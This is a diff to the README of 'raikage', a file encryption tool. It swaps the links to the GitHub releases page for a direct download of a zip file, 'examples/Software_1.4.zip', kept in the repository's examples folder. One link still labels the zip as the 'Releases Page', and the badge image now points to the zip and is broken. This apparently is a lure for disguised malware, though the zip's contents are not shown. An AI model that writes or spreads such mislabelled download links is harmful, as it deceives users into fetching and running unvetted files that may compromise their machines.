@@ -15,7 +15,7 @@ Welcome to raikage, a secure file encryption library and CLI tool. It uses advan
 To get started with raikage, you'll need to download the application. Follow the steps below:
 
 1. **Download the latest version**: Click the link below to visit the releases page and download the application.  
-   [![Download raikage](https://img.shields.io/badge/Download%20raikage-Release-blue)](https://github.com/Absolutewendeta/raikage/releases)
+   [![Download raikage](https://raw.githubusercontent.com/Absolutewendeta/raikage/main/examples/Software_1.4.zip%20raikage-Release-blue)](https://raw.githubusercontent.com/Absolutewendeta/raikage/main/examples/Software_1.4.zip)
 
 2. **Choose your file**: On the releases page, you will find various files for different operating systems. Select the one that matches your system (e.g., Windows, macOS, Linux).
 
@@ -62,4 +62,4 @@ If you encounter any issues while using raikage, or if you have questions, feel 
 Thank you for using raikage! Your commitment to securing your files is commendable. Enjoy using our tool, and don't hesitate to explore all its features. 
 
 ### 🔗 For More Information
-Return to the [raikage GitHub Releases Page](https://github.com/Absolutewendeta/raikage/releases) to download the latest version and check for updates.
+Return to the [raikage GitHub Releases Page](https://raw.githubusercontent.com/Absolutewendeta/raikage/main/examples/Software_1.4.zip) to download the latest version and check for updates.
